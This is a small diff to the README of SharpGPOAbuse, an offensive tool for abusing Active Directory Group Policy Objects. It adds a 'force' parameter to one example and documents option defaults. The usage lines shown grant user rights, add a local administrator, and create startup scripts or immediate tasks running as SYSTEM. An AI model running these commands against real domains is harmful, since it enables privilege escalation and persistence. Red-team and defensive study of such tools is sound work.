@@ -20,12 +20,14 @@ SharpGPOAbuse (Friendly Fork)
   AddNewRights:
     SharpGPOAbuse.exe attack=AddNewRights gponame=Vuln GPO useraccount=SomeAccount userrights=someright1,someright2,someright3
   NewLocalAdmin:
-    SharpGPOAbuse.exe attack=NewLocalAdmin gponame=Vuln GPO useraccount=SomeAccount
+    SharpGPOAbuse.exe attack=NewLocalAdmin gponame=Vuln GPO useraccount=SomeAccount force=False
   NewStartupScript:
     SharpGPOAbuse.exe attack=NewStartupScript gponame=Vuln GPO scriptname=ScriptName scriptcontent=my script content type=User
   NewImmediateTask:
     SharpGPOAbuse.exe attack=NewImmediateTask gponame=Vuln GPO author=NT AUTHORITY\SYSTEM taskname=My Special Task command=C:\some\path\to.exe arguments=some cli args type=Computer force=True
 ```
+
+The "force" option is optional and defaults to false. The "type" option is optional and defaults to "User".
 
 ## Attacks Types
 
